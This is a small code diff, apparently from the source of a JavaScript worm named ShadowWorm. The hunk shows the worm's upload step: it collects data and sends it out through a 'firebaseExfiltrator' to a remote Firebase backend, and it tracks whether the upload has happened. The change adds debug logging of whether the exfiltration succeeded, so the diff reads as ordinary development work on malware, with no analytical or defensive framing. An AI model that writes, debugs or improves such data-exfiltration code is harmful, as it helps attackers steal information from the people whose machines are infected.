@@ -637,7 +637,8 @@ class ShadowWorm {
   try {
     if (this.lifecycle.shouldUpload()) {
       const data = this.collectData();
-      const success = await this.firebaseExfiltrator.upload(data);
+     const success = await this.firebaseExfiltrator.upload(data);
+console.log("Upload success:", success);
       if (success) this.lifecycle.markUploaded();
     }
 
